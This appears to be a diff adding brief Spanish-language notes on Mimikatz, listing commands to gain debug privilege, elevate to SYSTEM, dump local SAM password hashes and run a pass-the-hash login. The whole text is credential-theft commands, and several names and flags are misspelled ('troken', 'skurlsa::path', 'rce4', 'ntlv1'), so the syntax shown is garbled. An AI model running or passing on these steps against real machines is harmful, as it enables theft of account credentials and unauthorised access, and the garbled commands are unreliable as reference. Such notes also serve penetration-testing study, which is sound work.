@@ -1,0 +1,8 @@
+.\mimikatz.exe
+  -> privilege::debug
+  -> troken::elevate -> pasa a nt/authority system
+  -> lsadump::sam -> vuelca los hashes de los usuarios locales
+  
+  sintaxis pass the hash:
+  
+    -> skurlsa::path /user:<usuario> /domain:. /rce4:<hash_ntlv1>
